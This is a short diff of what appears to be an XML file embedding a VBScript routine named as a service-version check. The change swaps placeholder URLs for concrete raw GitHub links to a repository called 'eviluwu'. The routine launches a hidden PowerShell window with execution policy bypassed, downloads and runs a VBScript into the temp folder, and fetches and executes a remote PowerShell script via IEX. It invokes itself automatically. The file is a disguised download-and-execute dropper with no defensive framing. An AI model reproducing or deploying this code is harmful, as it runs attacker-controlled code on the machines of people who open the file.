@@ -7,7 +7,7 @@
 <![CDATA[
     Sub XMLCheckServiceVersion()
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://your-domain.com/HP.vbs' -OutFile '$env:TEMP\HP'; & wscript.exe //E:vbscript HiddenPowershell.vbs -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://YOUR_RAW_GIST_URL_HERE')""", 0
+        objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/HP.vbs' -OutFile '$env:TEMP\HP'; & wscript.exe //E:vbscript HP -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/uwu.ps1')""", 0
     End Sub
 
     XMLCheckServiceVersion()
